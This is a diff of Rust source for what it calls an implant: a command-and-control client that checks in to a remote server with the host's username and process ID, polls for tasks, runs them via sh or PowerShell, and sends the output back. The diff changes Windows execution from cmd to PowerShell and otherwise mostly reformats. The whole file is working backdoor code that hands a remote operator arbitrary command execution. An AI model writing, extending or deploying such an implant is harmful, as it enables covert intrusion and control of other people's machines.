@@ -2,12 +2,16 @@ use clap::Parser;
 use reqwest::Client;
 use serde::{Deserialize, Serialize};
 use std::error::Error;
-use std::{net::UdpSocket, process::Command, time::{Duration, SystemTime}};
+use std::{
+    net::UdpSocket,
+    process::Command,
+    time::{Duration, SystemTime},
+};
 use tokio::time::sleep;
 use uuid::Uuid;
 use whoami;
 
-use rb::message::{ImplantCheckin, CheckinResponse, CommandOutput};
+use rb::message::{CheckinResponse, CommandOutput, ImplantCheckin};
 use rb::task::{Task, TaskResult, TaskStatus};
 
 /// CLI arguments for the implant
@@ -56,18 +60,18 @@ pub async fn run_implant_with_args(args: Args) -> Result<(), Box<dyn Error>> {
         username: whoami::username(),
         process_id: std::process::id(),
     };
-    
+
     let resp = client
         .post(&format!("{}/checkin", base_url))
         .json(&checkin)
         .send()
         .await?;
-        
+
     if !resp.status().is_success() {
-        let status = resp.status(); 
+        let status = resp.status();
         let body = resp.text().await.unwrap_or_default();
         return Err(format!("Check-in failed ({}): {}", status, body).into());
-}    
+    }
     let data: CheckinResponse = resp.json().await?;
     let implant_id = data.implant_id;
     println!("Checked in. Implant ID: {}", implant_id);
@@ -78,15 +82,16 @@ pub async fn run_implant_with_args(args: Args) -> Result<(), Box<dyn Error>> {
         let tasks_resp = match client
             .get(&format!("{}/tasks/{}", base_url, implant_id))
             .send()
-            .await {
-                Ok(resp) => resp,
-                Err(e) => {
-                    eprintln!("Failed to fetch tasks: {}", e);
-                    sleep(Duration::from_secs(args.interval)).await;
-                    continue;
-                }
-            };
-            
+            .await
+        {
+            Ok(resp) => resp,
+            Err(e) => {
+                eprintln!("Failed to fetch tasks: {}", e);
+                sleep(Duration::from_secs(args.interval)).await;
+                continue;
+            }
+        };
+
         let tasks: Vec<Task> = tasks_resp.json().await.unwrap_or_else(|_| {
             eprintln!("Failed to parse tasks response");
             Vec::new()
@@ -98,9 +103,13 @@ pub async fn run_implant_with_args(args: Args) -> Result<(), Box<dyn Error>> {
             println!("Executing command: {}", task.command);
             let now = SystemTime::now();
 
+            dbg!(&task);
+
             // Shell out the command (use cmd.exe on Windows)
             let result = if cfg!(target_os = "windows") {
-                Command::new("cmd").args(["/C", &task.command]).output()
+                Command::new("powershell")
+                    .args(["-c", &task.command, &task.args.join(" ")])
+                    .output()
             } else {
                 Command::new("sh").args(["-c", &task.command]).output()
             };
@@ -110,32 +119,32 @@ pub async fn run_implant_with_args(args: Args) -> Result<(), Box<dyn Error>> {
                     let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                     let stderr = String::from_utf8_lossy(&output.stderr).to_string();
                     let combined_output = format!("{}{}", stdout, stderr);
-                    
+
                     TaskResult {
-                        task_id:     task.id,
+                        task_id: task.id,
                         implant_id,
-                        session_id:  task.session_id,
-                        output:      CommandOutput::Text(combined_output),
-                        status:      TaskStatus::Completed,
+                        session_id: task.session_id,
+                        output: CommandOutput::Text(combined_output),
+                        status: TaskStatus::Completed,
                         status_code: output.status.code(),
                         completed_at: now,
-                        error:       None, // No error for successful execution
+                        error: None, // No error for successful execution
                     }
                 }
                 Err(e) => {
                     let error_msg = format!("Failed to spawn command: {}", e);
-                    
+
                     TaskResult {
-                        task_id:     task.id,
+                        task_id: task.id,
                         implant_id,
-                        session_id:  task.session_id,
-                        output:      CommandOutput::None,
-                        status:      TaskStatus::Failed,
+                        session_id: task.session_id,
+                        output: CommandOutput::None,
+                        status: TaskStatus::Failed,
                         status_code: None,
                         completed_at: now,
-                        error:       Some(error_msg),
+                        error: Some(error_msg),
                     }
-                },
+                }
             };
 
             // Post the result back
@@ -143,9 +152,10 @@ pub async fn run_implant_with_args(args: Args) -> Result<(), Box<dyn Error>> {
                 .post(&format!("{}/results", base_url))
                 .json(&task_result)
                 .send()
-                .await {
-                    eprintln!("Failed to submit results: {}", e);
-                }
+                .await
+            {
+                eprintln!("Failed to submit results: {}", e);
+            }
         }
 
         // Wait before the next poll
